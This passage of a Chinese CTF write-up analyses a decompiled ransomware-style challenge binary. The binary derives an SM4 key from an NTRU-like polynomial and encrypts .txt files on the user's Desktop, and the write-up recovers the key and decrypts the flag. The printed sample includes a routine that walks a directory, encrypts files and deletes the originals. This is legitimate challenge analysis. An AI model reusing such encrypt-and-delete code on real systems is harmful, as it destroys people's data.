class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Decompiled with PyLingual (https://pylingual.io)</span><br><span class="hljs-comment"># Internal filename: task.py</span><br><span class="hljs-comment"># Bytecode version: 3.8.0rc1+ (3413)</span><br><span class="hljs-comment"># Source timestamp: 1970-01-01 00:00:00 UTC (0)</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Created on Sun Mar 30 18:25:08 2025</span><br><span class="hljs-string"></span><br><span class="hljs-string">@author: Crypto0</span><br><span class="hljs-string"></span><br><span class="hljs-string">import re</span><br><span class="hljs-string">import base64</span><br><span class="hljs-string">import os</span><br><span class="hljs-string">import sys</span><br><span class="hljs-string">from gmssl import sm4</span><br><span class="hljs-string">from Crypto.Util.Padding import pad</span><br><span class="hljs-string">import binascii</span><br><span class="hljs-string">from random import shuffle, randrange</span><br><span class="hljs-string"></span><br><span class="hljs-string">N = 49 </span><br><span class="hljs-string">p = 3</span><br><span class="hljs-string">q = 128  </span><br><span class="hljs-string">d = 3</span><br><span class="hljs-string">assert q &gt; (6 * d + 1) * p</span><br><span class="hljs-string">R.&lt;x&gt; = ZZ[]</span><br><span class="hljs-string">def generate_T(d1, d2):</span><br><span class="hljs-string">    assert N &gt;= d1 + d2</span><br><span class="hljs-string">    s = [1] * d1 + [-1] * d2 + [0] * (N - d1 - d2)</span><br><span class="hljs-string">    shuffle(s)</span><br><span class="hljs-string">    return R(s)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def invert_mod_prime(f, p):</span><br><span class="hljs-string">    Rp = R.change_ring(Integers(p)).quotient(x^N - 1)</span><br><span class="hljs-string">    return R(lift(1 / Rp(f)))</span><br><span class="hljs-string"></span><br><span class="hljs-string">def convolution(f, g):</span><br><span class="hljs-string">    return (f * g) % (x^N - 1)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def lift_mod(f, q):</span><br><span class="hljs-string">    return R([((f[i] + q // 2) % q) - q // 2 for i in range(N)])</span><br><span class="hljs-string"></span><br><span class="hljs-string">def poly_mod(f, q):</span><br><span class="hljs-string">    return R([f[i] % q for i in range(N)])</span><br><span class="hljs-string"></span><br><span class="hljs-string">def invert_mod_pow2(f, q):</span><br><span class="hljs-string">    assert q.is_power_of(2)</span><br><span class="hljs-string">    g = invert_mod_prime(f, 2)</span><br><span class="hljs-string">    while True:</span><br><span class="hljs-string">        r = lift_mod(convolution(g, f), q)</span><br><span class="hljs-string">        if r == 1:</span><br><span class="hljs-string">            return g</span><br><span class="hljs-string">        g = lift_mod(convolution(g, 2 - r), q)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def generate_message():</span><br><span class="hljs-string">    return R([randrange(p) - 1 for _ in range(N)])</span><br><span class="hljs-string"></span><br><span class="hljs-string">def generate_key():</span><br><span class="hljs-string">    while True:</span><br><span class="hljs-string">        try:</span><br><span class="hljs-string">            f = generate_T(d + 1, d)</span><br><span class="hljs-string">            g = generate_T(d, d)</span><br><span class="hljs-string">            Fp = poly_mod(invert_mod_prime(f, p), p)</span><br><span class="hljs-string">            Fq = poly_mod(invert_mod_pow2(f, q), q)</span><br><span class="hljs-string">            break</span><br><span class="hljs-string">        except:</span><br><span class="hljs-string">            continue</span><br><span class="hljs-string">    h = poly_mod(convolution(Fq, g), q)</span><br><span class="hljs-string">    return h, (f, g)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def encrypt_message(m, h):</span><br><span class="hljs-string">    e = lift_mod(p * convolution(h, generate_T(d, d)) + m, q)</span><br><span class="hljs-string">    return e</span><br><span class="hljs-string"></span><br><span class="hljs-string">def save_ntru_keys():</span><br><span class="hljs-string">    h, secret = generate_key()</span><br><span class="hljs-string">    with open(&quot;pub_key.txt&quot;, &quot;w&quot;) as f:</span><br><span class="hljs-string">        f.write(str(h))</span><br><span class="hljs-string">    m = generate_message()</span><br><span class="hljs-string">    with open(&quot;priv_key.txt&quot;, &quot;w&quot;) as f:</span><br><span class="hljs-string">        f.write(str(m))</span><br><span class="hljs-string">    e = encrypt_message(m, h)</span><br><span class="hljs-string">    with open(&quot;enc.txt&quot;, &quot;w&quot;) as f:</span><br><span class="hljs-string">        f.write(str(e))</span><br><span class="hljs-string"></span><br><span class="hljs-string">def terms(poly_str):</span><br><span class="hljs-string">    terms = []</span><br><span class="hljs-string">    pattern = r&#x27;([+-]?\\s*x\\^?\\d*|[-+]?\\s*\\d+)&#x27;</span><br><span class="hljs-string">    matches = re.finditer(pattern, poly_str.replace(&#x27; &#x27;, &#x27;&#x27;))</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    for match in matches:</span><br><span class="hljs-string">        term = match.group()</span><br><span class="hljs-string">        if term == &#x27;+x&#x27; or term == &#x27;x&#x27;:</span><br><span class="hljs-string">            terms.append(1)</span><br><span class="hljs-string">        elif term == &#x27;-x&#x27;:</span><br><span class="hljs-string">            terms.append(-1)</span><br><span class="hljs-string">        elif &#x27;x^&#x27; in term:</span><br><span class="hljs-string">            coeff_part = term.split(&#x27;x^&#x27;)[0]</span><br><span class="hljs-string">            exponent = int(term.split(&#x27;x^&#x27;)[1])</span><br><span class="hljs-string">            if not coeff_part or coeff_part == &#x27;+&#x27;:</span><br><span class="hljs-string">                coeff = 1</span><br><span class="hljs-string">            elif coeff_part == &#x27;-&#x27;:</span><br><span class="hljs-string">                coeff = -1</span><br><span class="hljs-string">            else:</span><br><span class="hljs-string">                coeff = int(coeff_part)</span><br><span class="hljs-string">            terms.append(coeff * exponent)</span><br><span class="hljs-string">        elif &#x27;x&#x27; in term:</span><br><span class="hljs-string">            coeff_part = term.split(&#x27;x&#x27;)[0]</span><br><span class="hljs-string">            if not coeff_part or coeff_part == &#x27;+&#x27;:</span><br><span class="hljs-string">                terms.append(1)</span><br><span class="hljs-string">            elif coeff_part == &#x27;-&#x27;:</span><br><span class="hljs-string">                terms.append(-1)</span><br><span class="hljs-string">            else:</span><br><span class="hljs-string">                terms.append(int(coeff_part))</span><br><span class="hljs-string">        else:</span><br><span class="hljs-string">            if term == &#x27;+1&#x27; or term == &#x27;1&#x27;:</span><br><span class="hljs-string">                terms.append(0)</span><br><span class="hljs-string">                terms.append(-0)</span><br><span class="hljs-string">    return terms</span><br><span class="hljs-string"></span><br><span class="hljs-string">def gen_key(poly_terms):</span><br><span class="hljs-string">    binary = [0] * 128</span><br><span class="hljs-string">    for term in poly_terms:</span><br><span class="hljs-string">        exponent = abs(term)</span><br><span class="hljs-string">        if term &gt; 0 and exponent &lt;= 127:  </span><br><span class="hljs-string">            binary[127 - exponent] = 1</span><br><span class="hljs-string">    binary_str = &#x27;&#x27;.join(map(str, binary))</span><br><span class="hljs-string">    hex_key = hex(int(binary_str, 2))[2:].upper().zfill(32)</span><br><span class="hljs-string">    return hex_key</span><br><span class="hljs-string"></span><br><span class="hljs-string">def read_polynomial_from_file(filename):</span><br><span class="hljs-string">    with open(filename, &#x27;r&#x27;) as file:</span><br><span class="hljs-string">        return file.read().strip()</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">def sm4_encrypt(key, plaintext):</span><br><span class="hljs-string">    assert len(key) == 16, &quot;SM4 key must be 16 bytes&quot;</span><br><span class="hljs-string">    cipher = sm4.CryptSM4()</span><br><span class="hljs-string">    cipher.set_key(key, sm4.SM4_ENCRYPT)</span><br><span class="hljs-string">    padded_plaintext = pad(plaintext, 16)</span><br><span class="hljs-string">    return cipher.crypt_ecb(padded_plaintext)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def sm4_encrypt_file(input_path, output_path, key):</span><br><span class="hljs-string">    with open(input_path, &#x27;rb&#x27;) as f:</span><br><span class="hljs-string">        plaintext = f.read()</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    ciphertext = sm4_encrypt(key, plaintext)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    with open(output_path, &#x27;wb&#x27;) as f:</span><br><span class="hljs-string">        f.write(ciphertext)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def resource_path(relative_path):</span><br><span class="hljs-string">    if getattr(sys, &#x27;frozen&#x27;, False):</span><br><span class="hljs-string">        base_path = sys._MEIPASS</span><br><span class="hljs-string">    else:</span><br><span class="hljs-string">        base_path = os.path.abspath(&quot;.&quot;)</span><br><span class="hljs-string">    return os.path.join(base_path, relative_path)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def encrypt_directory(directory, sm4_key, extensions=[&quot;.txt&quot;]):</span><br><span class="hljs-string">    if not os.path.exists(directory):</span><br><span class="hljs-string">        print(f&quot;Directory does not exist: &#123;directory&#125;&quot;)</span><br><span class="hljs-string">        return</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    for root, _, files in os.walk(directory):</span><br><span class="hljs-string">        for file in files:</span><br><span class="hljs-string">            if any(file.endswith(ext) for ext in extensions):</span><br><span class="hljs-string">                input_path = os.path.join(root, file)</span><br><span class="hljs-string">                output_path = input_path + &quot;.enc&quot;</span><br><span class="hljs-string">                </span><br><span class="hljs-string">                try:</span><br><span class="hljs-string">                    sm4_encrypt_file(input_path, output_path, sm4_key)</span><br><span class="hljs-string">                    os.remove(input_path)</span><br><span class="hljs-string">                    print(f&quot;Encrypted: &#123;input_path&#125; -&gt; &#123;output_path&#125;&quot;)</span><br><span class="hljs-string">                except Exception as e:</span><br><span class="hljs-string">                    print(f&quot;Error encrypting &#123;input_path&#125;: &#123;str(e)&#125;&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def main():</span><br><span class="hljs-string">    try:</span><br><span class="hljs-string">        save_ntru_keys()</span><br><span class="hljs-string">        poly_str = read_polynomial_from_file(&quot;priv_key.txt&quot;)</span><br><span class="hljs-string">        poly_terms = terms(poly_str)</span><br><span class="hljs-string">        sm4_key = binascii.unhexlify(poly_terms)</span><br><span class="hljs-string">        user_name = os.getlogin()</span><br><span class="hljs-string">        target_dir = os.path.join(&quot;C:\\Users&quot;, user_name, &quot;Desktop&quot;, &quot;test_files&quot;)</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        if not os.path.exists(target_dir):</span><br><span class="hljs-string">            os.makedirs(target_dir, exist_ok=True)</span><br><span class="hljs-string">            print(f&quot;Created directory: &#123;target_dir&#125;&quot;)</span><br><span class="hljs-string">            return</span><br><span class="hljs-string">            </span><br><span class="hljs-string">        txt_files = [f for f in os.listdir(target_dir) </span><br><span class="hljs-string">                    if f.endswith(&#x27;.txt&#x27;) and os.path.isfile(os.path.join(target_dir, f))]</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        if not txt_files:</span><br><span class="hljs-string">            print(&quot;No .txt files found in directory&quot;)</span><br><span class="hljs-string">            return</span><br><span class="hljs-string">            </span><br><span class="hljs-string">        for txt_file in txt_files:</span><br><span class="hljs-string">            file_path = os.path.join(target_dir, txt_file)</span><br><span class="hljs-string">            try:</span><br><span class="hljs-string">                with open(file_path, &#x27;rb&#x27;) as f:</span><br><span class="hljs-string">                    test_data = f.read()</span><br><span class="hljs-string">                </span><br><span class="hljs-string">                ciphertext = sm4_encrypt(sm4_key, test_data)</span><br><span class="hljs-string">                encrypted_path = file_path + &#x27;.enc&#x27;</span><br><span class="hljs-string">                </span><br><span class="hljs-string">                with open(encrypted_path, &#x27;wb&#x27;) as f:</span><br><span class="hljs-string">                f.write(ciphertext)</span><br><span class="hljs-string">            except Exception as e:</span><br><span class="hljs-string">                print(f&quot;Error processing &#123;txt_file&#125;: &#123;str(e)&#125;&quot;)</span><br><span class="hljs-string">                </span><br><span class="hljs-string">    except Exception as e:</span><br><span class="hljs-string">        print(f&quot;Fatal error: &#123;str(e)&#125;&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">if __name__ == &quot;__main__&quot;:</span><br><span class="hljs-string">    main()</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>在解包后的 <code>task.exe_extracted/res</code> 目录下有两个文件 <code>enc.txt</code> 和 <code>pib_key.txt</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/7f8f59afc9bc0b88.png"></p><p>enc.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">e = <span class="hljs-number">31</span>*x^<span class="hljs-number">48</span> - <span class="hljs-number">14</span>*x^<span class="hljs-number">47</span> + x^<span class="hljs-number">46</span> + <span class="hljs-number">8</span>*x^<span class="hljs-number">45</span> - <span class="hljs-number">9</span>*x^<span class="hljs-number">44</span> - <span class="hljs-number">18</span>*x^<span class="hljs-number">43</span> - <span class="hljs-number">30</span>*x^<span class="hljs-number">41</span> + <span class="hljs-number">14</span>*x^<span class="hljs-number">40</span> + <span class="hljs-number">3</span>*x^<span class="hljs-number">39</span> - <span class="hljs-number">17</span>*x^<span class="hljs-number">38</span> + <span class="hljs-number">22</span>*x^<span class="hljs-number">37</span> + <span class="hljs-number">7</span>*x^<span class="hljs-number">36</span> + <span class="hljs-number">31</span>*x^<span class="hljs-number">34</span> - <span class="hljs-number">30</span>*x^<span class="hljs-number">33</span> - <span class="hljs-number">22</span>*x^<span class="hljs-number">32</span> - <span class="hljs-number">25</span>*x^<span class="hljs-number">31</span> + <span class="hljs-number">31</span>*x^<span class="hljs-number">30</span> - <span class="hljs-number">28</span>*x^<span class="hljs-number">29</span> + <span class="hljs-number">7</span>*x^<span class="hljs-number">28</span> + <span class="hljs-number">23</span>*x^<span class="hljs-number">27</span> - <span class="hljs-number">6</span>*x^<span class="hljs-number">26</span> + <span class="hljs-number">12</span>*x^<span class="hljs-number">25</span> - <span class="hljs-number">6</span>*x^<span class="hljs-number">24</span> + <span class="hljs-number">5</span>*x^<span class="hljs-number">23</span> - <span class="hljs-number">13</span>*x^<span class="hljs-number">22</span> - <span class="hljs-number">10</span>*x^<span class="hljs-number">20</span> + <span class="hljs-number">4</span>*x^<span class="hljs-number">19</span> + <span class="hljs-number">15</span>*x^<span class="hljs-number">18</span> + <span class="hljs-number">23</span>*x^<span class="hljs-number">17</span> + <span class="hljs-number">24</span>*x^<span class="hljs-number">16</span> - <span class="hljs-number">2</span>*x^<span class="hljs-number">15</span> - <span class="hljs-number">8</span>*x^<span class="hljs-number">14</span> - <span class="hljs-number">20</span>*x^<span class="hljs-number">13</span> + <span class="hljs-number">24</span>*x^<span class="hljs-number">12</span> - <span class="hljs-number">23</span>*x^<span class="hljs-number">11</span> - <span class="hljs-number">4</span>*x^<span class="hljs-number">10</span> - <span class="hljs-number">26</span>*x^<span class="hljs-number">9</span> - <span class="hljs-number">14</span>*x^<span class="hljs-number">8</span> + <span class="hljs-number">10</span>*x^<span class="hljs-number">7</span> + <span class="hljs-number">4</span>*x^<span class="hljs-number">6</span> - <span class="hljs-number">4</span>*x^<span class="hljs-number">5</span> - <span class="hljs-number">32</span>*x^<span class="hljs-number">4</span> - <span class="hljs-number">5</span>*x^<span class="hljs-number">3</span> - <span class="hljs-number">31</span>*x^<span class="hljs-number">2</span> + <span class="hljs-number">16</span>*x + <span class="hljs-number">11</span><br>-x^<span class="hljs-number">48</span> - x^<span class="hljs-number">46</span> + x^<span class="hljs-number">45</span> + x^<span class="hljs-number">43</span> - x^<span class="hljs-number">42</span> + x^<span class="hljs-number">41</span> + x^<span class="hljs-number">40</span> + x^<span class="hljs-number">36</span> - x^<span class="hljs-number">35</span> + x^<span class="hljs-number">34</span> - x^<span class="hljs-number">33</span> + x^<span class="hljs-number">32</span> - x^<span class="hljs-number">30</span> + x^<span class="hljs-number">29</span> - x^<span class="hljs-number">28</span> - x^<span class="hljs-number">27</span> - x^<span class="hljs-number">26</span> - x^<span class="hljs-number">25</span> - x^<span class="hljs-number">23</span> - x^<span class="hljs-number">22</span> + x^<span class="hljs-number">21</span> + x^<span class="hljs-number">20</span> + x^<span class="hljs-number">19</span> + x^<span class="hljs-number">18</span> - x^<span class="hljs-number">17</span> - x^<span class="hljs-number">16</span> - x^<span class="hljs-number">15</span> - x^<span class="hljs-number">14</span> - x^<span class="hljs-number">12</span> + x^<span class="hljs-number">9</span> - x^<span class="hljs-number">7</span> - x^<span class="hljs-number">6</span> - x^<span class="hljs-number">5</span> - x^<span class="hljs-number">4</span> + x^<span class="hljs-number">3</span> - x + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>pub_key.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">h = <span class="hljs-number">8</span>*x^<span class="hljs-number">48</span> + <span class="hljs-number">58</span>*x^<span class="hljs-number">47</span> + <span class="hljs-number">18</span>*x^<span class="hljs-number">46</span> + <span class="hljs-number">61</span>*x^<span class="hljs-number">45</span> + <span class="hljs-number">33</span>*x^<span class="hljs-number">44</span> + <span class="hljs-number">21</span>*x^<span class="hljs-number">43</span> + <span class="hljs-number">58</span>*x^<span class="hljs-number">42</span> + <span class="hljs-number">21</span>*x^<span class="hljs-number">41</span> + <span class="hljs-number">5</span>*x^<span class="hljs-number">40</span> + <span class="hljs-number">32</span>*x^<span class="hljs-number">39</span> + <span class="hljs-number">15</span>*x^<span class="hljs-number">38</span> + <span class="hljs-number">40</span>*x^<span class="hljs-number">37</span> + <span class="hljs-number">24</span>*x^<span class="hljs-number">36</span> + <span class="hljs-number">14</span>*x^<span class="hljs-number">35</span> + <span class="hljs-number">40</span>*x^<span class="hljs-number">34</span> + <span class="hljs-number">5</span>*x^<span class="hljs-number">33</span> + x^<span class="hljs-number">32</span> + <span class="hljs-number">48</span>*x^<span class="hljs-number">31</span> + <span class="hljs-number">21</span>*x^<span class="hljs-number">30</span> + <span class="hljs-number">36</span>*x^<span class="hljs-number">29</span> + <span class="hljs-number">42</span>*x^<span class="hljs-number">28</span> + <span class="hljs-number">8</span>*x^<span class="hljs-number">27</span> + <span class="hljs-number">17</span>*x^<span class="hljs-number">26</span> + <span class="hljs-number">54</span>*x^<span class="hljs-number">25</span> + <span class="hljs-number">39</span>*x^<span class="hljs-number">24</span> + <span class="hljs-number">38</span>*x^<span class="hljs-number">23</span> + <span class="hljs-number">14</span>*x^<span class="hljs-number">22</span> + <span class="hljs-number">22</span>*x^<span class="hljs-number">21</span> + <span class="hljs-number">26</span>*x^<span class="hljs-number">20</span> + <span class="hljs-number">22</span>*x^<span class="hljs-number">18</span> + <span class="hljs-number">7</span>*x^<span class="hljs-number">17</span> + <span class="hljs-number">29</span>*x^<span class="hljs-number">16</span> + <span class="hljs-number">53</span>*x^<span class="hljs-number">15</span> + <span class="hljs-number">50</span>*x^<span class="hljs-number">14</span> + <span class="hljs-number">49</span>*x^<span class="hljs-number">13</span> + <span class="hljs-number">21</span>*x^<span class="hljs-number">12</span> + <span class="hljs-number">47</span>*x^<span class="hljs-number">11</span> + <span class="hljs-number">50</span>*x^<span class="hljs-number">10</span> + <span class="hljs-number">32</span>*x^<span class="hljs-number">9</span> + <span class="hljs-number">14</span>*x^<span class="hljs-number">8</span> + <span class="hljs-number">50</span>*x^<span class="hljs-number">7</span> + <span class="hljs-number">18</span>*x^<span class="hljs-number">6</span> + <span class="hljs-number">9</span>*x^<span class="hljs-number">5</span> + <span class="hljs-number">61</span>*x^<span class="hljs-number">4</span> + <span class="hljs-number">10</span>*x^<span class="hljs-number">3</span> + <span class="hljs-number">9</span>*x^<span class="hljs-number">2</span> + <span class="hljs-number">11</span>*x + <span class="hljs-number">47</span><br></code></pre></td></tr></table></figure><p>flag.txt.enc</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">bf<span class="hljs-number">0</span>cb<span class="hljs-number">5</span><span class="hljs-keyword">cc</span><span class="hljs-number">6</span>bea<span class="hljs-number">6146e9</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>f<span class="hljs-number">109</span>df<span class="hljs-number">953</span>a<span class="hljs-number">57</span>daa<span class="hljs-number">416</span>d<span class="hljs-number">38</span>a<span class="hljs-number">8</span>ffba<span class="hljs-number">6438e7</span>e<span class="hljs-number">599613e01</span>f<span class="hljs-number">3</span>b<span class="hljs-number">9</span>a<span class="hljs-number">53</span>dace<span class="hljs-number">4</span>ccd<span class="hljs-number">55</span>cd<span class="hljs-number">3e55</span>ef<span class="hljs-number">88e0</span>b<span class="hljs-number">835</span><br></code></pre></td></tr></table></figure><p>从 <code>enc.txt</code> 的第二个多项式（私钥）提取正项指数（带 + 的指数）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">-x^<span class="hljs-number">48</span> -x^<span class="hljs-number">46</span> +x^<span class="hljs-number">45</span> +x^<span class="hljs-number">43</span> -x^<span class="hljs-number">42</span> +x^<span class="hljs-number">41</span> +x^<span class="hljs-number">40</span> +x^<span class="hljs-number">36</span> -x^<span class="hljs-number">35</span> +x^<span class="hljs-number">34</span> -x^<span class="hljs-number">33</span> +x^<span class="hljs-number">32</span> -x^<span class="hljs-number">30</span> +x^<span class="hljs-number">29</span> -x^<span class="hljs-number">28</span> -x^<span class="hljs-number">27</span> -x^<span class="hljs-number">26</span> -x^<span class="hljs-number">25</span> -x^<span class="hljs-number">23</span> -x^<span class="hljs-number">22</span> +x^<span class="hljs-number">21</span> +x^<span class="hljs-number">20</span> +x^<span class="hljs-number">19</span> +x^<span class="hljs-number">18</span> -x^<span class="hljs-number">17</span> -x^<span class="hljs-number">16</span> -x^<span class="hljs-number">15</span> -x^<span class="hljs-number">14</span> -x^<span class="hljs-number">12</span> +x^<span class="hljs-number">9</span> -x^<span class="hljs-number">7</span> -x^<span class="hljs-number">6</span> -x^<span class="hljs-number">5</span> -x^<span class="hljs-number">4</span> +x^<span class="hljs-number">3</span> -x +<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>正项指数列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">key_exponents = [<span class="hljs-number">45</span>, <span class="hljs-number">43</span>, <span class="hljs-number">41</span>, <span class="hljs-number">40</span>, <span class="hljs-number">36</span>, <span class="hljs-number">34</span>, <span class="hljs-number">32</span>, <span class="hljs-number">29</span>, <span class="hljs-number">21</span>, <span class="hljs-number">20</span>, <span class="hljs-number">19</span>, <span class="hljs-number">18</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> sm4<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-comment"># 私钥多项式中的正项指数</span><br>KEY_EXPONENTS = [<span class="hljs-number">45</span>, <span class="hljs-number">43</span>, <span class="hljs-number">41</span>, <span class="hljs-number">40</span>, <span class="hljs-number">36</span>, <span class="hljs-number">34</span>, <span class="hljs-number">32</span>, <span class="hljs-number">29</span>, <span class="hljs-number">21</span>, <span class="hljs-number">20</span>, <span class="hljs-number">19</span>, <span class="hljs-number">18</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>]<br><br><span class="hljs-comment"># 密文（hex格式）</span><br>CIPHER_TEXT_HEX = <span class="hljs-string">&quot;bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_sm4_key</span>(<span class="hljs-params">exponents</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;生成 SM4 密钥&quot;&quot;&quot;</span><br>    binary = [<span class="hljs-number">0</span>] * <span class="hljs-number">128</span><br>    <span class="hljs-keyword">for</span> exp <span class="hljs-keyword">in</span> exponents:<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt; exp &lt;= <span class="hljs-number">127</span>:<br>            binary[<span class="hljs-number">127</span> - exp] = <span class="hljs-number">1</span>  <span class="hljs-comment"># 计算二进制位</span><br>    hex_key = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, binary)), <span class="hljs-number">2</span>)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">32</span>)<br>    <span class="hljs-keyword">return</span> hex_key.upper()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag</span>():<br>    <span class="hljs-comment"># 生成密钥</span><br>    sm4_key_hex = generate_sm4_key(KEY_EXPONENTS)<br>    sm4_key = binascii.unhexlify(sm4_key_hex)<br>    <br>    <span class="hljs-comment"># 初始化 SM4 解密器</span><br>    cipher = sm4.CryptSM4()<br>    cipher.set_key(sm4_key, sm4.SM4_DECRYPT)<br>    <br>    <span class="hljs-comment"># 解密并移除填充</span><br>    ciphertext = binascii.unhexlify(CIPHER_TEXT_HEX)<br>    decrypted_padded = cipher.crypt_ecb(ciphertext)<br>    decrypted = unpad(decrypted_padded, <span class="hljs-number">16</span>)<br>    <br>    <span class="hljs-keyword">return</span> decrypted.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    flag = decrypt_flag()<br>    <span class="hljs-built_in">print</span>(<span 